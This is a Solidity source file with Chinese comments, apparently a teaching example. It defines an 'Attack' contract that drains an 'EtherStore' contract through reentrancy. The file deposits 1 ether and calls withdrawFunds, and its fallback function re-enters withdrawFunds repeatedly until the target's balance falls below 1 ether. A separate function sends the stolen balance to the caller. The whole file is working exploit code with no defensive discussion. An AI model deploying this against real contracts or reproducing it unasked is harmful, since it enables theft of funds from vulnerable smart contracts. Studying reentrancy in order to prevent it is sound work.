// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "EtherStore.sol"; // 确保路径正确

contract Attack {
    EtherStore public etherStore;

    // 初始化 etherStore 变量
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }
  
    function pwnEtherStore() public payable {
        // 攻击需要至少 1 个以太
        require(msg.value >= 1 ether, "Insufficient Ether");
        // 调用 EtherStore 的 depositFunds 函数
        etherStore.depositFunds{value: 1 ether}();
        // 开始攻击
        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        // 将合约中的余额发送给调用者
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // fallback 函数 - 攻击的核心逻辑
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
}
